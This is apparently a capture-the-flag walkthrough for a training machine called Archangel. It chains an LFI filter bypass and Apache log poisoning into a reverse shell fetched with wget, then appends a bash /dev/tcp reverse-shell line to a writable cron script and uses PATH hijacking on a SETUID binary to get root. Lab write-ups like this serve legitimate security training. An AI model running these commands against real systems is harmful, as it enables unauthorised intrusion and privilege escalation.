Title: Archangel 

A well known security solutions company seems to be doing some testing on their live machine. Best time to exploit it.

Initial Foothold

Running "nmap -sC -sV $IP"

Host is up (0.64s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 547.68 seconds

Nothing interesting came up. We run gobuster to search for any hidden directories.

gobuster dir -u http://10.10.126.77 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.126.77
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/20 00:50:54 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.126.77/images/]
/pages                (Status: 301) [Size: 312] [--> http://10.10.126.77/pages/] 
/flags                (Status: 301) [Size: 312] [--> http://10.10.126.77/flags/] 
/layout               (Status: 301) [Size: 313] [--> http://10.10.126.77/layout/]

Visiting "/flags" directory we got rick rolled.

Since we did not find anything interesting with nmap and gobuster, we search for any subdomains.

curl -s http://10.10.126.77 | grep ".thm"

Using curl i found a sudbomain with my first try "mafialive.thm" so no need to use any tools, writing that to our /etc/hosts file and accessing the web page, we find our first flag.

Now we start again with enumeration

wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mafialive.thm/FUZZ
Total requests: 37050

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000069:   200        3 L      3 W        59 Ch       "index.html"                                                        
000000157:   403        9 L      28 W       278 Ch      ".htaccess"                                                         
000000198:   200        15 L     21 W       286 Ch      "test.php"                                                          
000000248:   200        2 L      4 W        34 Ch       "robots.txt"  

we try robots.txt for any hidden files and it also direct us to the "test.php" page.

Follow the link on the page to discover that the test.php page accepts a parameter: 

curl -s http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
    
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        Control is an illusion    </div>
</body>

</html>

It is obvious that we have to deal with a Local File Inclusion (LFI). Unfortunately, it seems we canâ€™t read the code in test.php, probably due to a protection in the script. 

After some researching, we use the "php://filter" that allows us to bypass and encode the file as base64 string.
GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php

we decode the output:

echo CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg== | base64 -d

we get the source code and obtain the second flag.

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

            //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
        }
        ?>
    </div>
</body>

</html>

The code is checking that the 2 below conditions are met about the injected content:

    it should not contain ../..
    it should contain /var/www/html/development_testing

We can bypass the path traversal protection by replacing ../.. with .././.., as follows: 

curl -s http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log

Then we can poison the apache2 log file by injecting a PHP payload in the user-agent string as follows via burp:

GET http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=id

Then we can upload and php reverse shell opening a python server on our machine(python3 -m http.server)
GET http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=wget%20http://machine_ip:8000/reverse_shell.php

on our machine we use nc -lnvp 4444

we call the reverse shell via accesing http://mafialive.thm/reverse_shell.php

and the result:
nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.126.77 58938
Linux ubuntu 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 05:14:48 up  1:57,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh: 1: python: not found
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/$ id 
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

the flag is at /home/archangel directory.

Rooting the machine

There is an cronjob (/opt/helloworld.sh) executed by archangel every minute.

www-data@ubuntu:/opt$ cat helloworld.sh
cat helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt

and the script is writeable to us and as it runs bash, i add to the script:
echo "bash -i >& /dev/tcp/YOUR_IP/4242 0>&1" >> helloworld.sh

and in our machine: nc -lnvp 4242

after a minute we get a shell as archangel and we find another flag


archangel@ubuntu:~$ ls -la
ls -la
total 44
drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 .
drwxr-xr-x 3 root      root      4096 Nov 18  2020 ..
-rw-r--r-- 1 archangel archangel  220 Nov 18  2020 .bash_logout
-rw-r--r-- 1 archangel archangel 3771 Nov 18  2020 .bashrc
drwx------ 2 archangel archangel 4096 Nov 18  2020 .cache
drwxrwxr-x 3 archangel archangel 4096 Nov 18  2020 .local
drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfiles
-rw-r--r-- 1 archangel archangel  807 Nov 18  2020 .profile
drwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret
-rw-rw-r-- 1 archangel archangel   66 Nov 18  2020 .selected_editor
-rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt


we go to the secret directory which contains an interesting file called "backup" that has SETUID bit set, using strings we can see that the "cp" command is used to copy files


cp /home/user/archangel/myfiles/* /opt/backupfiles

As the script is not using the full path of cp, we can leave our own cp program in the directory.


archangel@ubuntu:~/secret$ cat > cp << EOF
> #!/bin/bash
> /bin/bash -i
> EOF
archangel@ubuntu:~/secret$ chmod +x cp
archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret:$PATH

Now, when we will execute the script, it will use our own cp command, which will execute a root shell: 

archangel@ubuntu:~/secret$ ./backup
./backup
bash: cannot set terminal process group (2063): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:~/secret# id
id
uid=0(root) gid=0(root) groups=0(root),1001(archangel)

and we get the root flag.




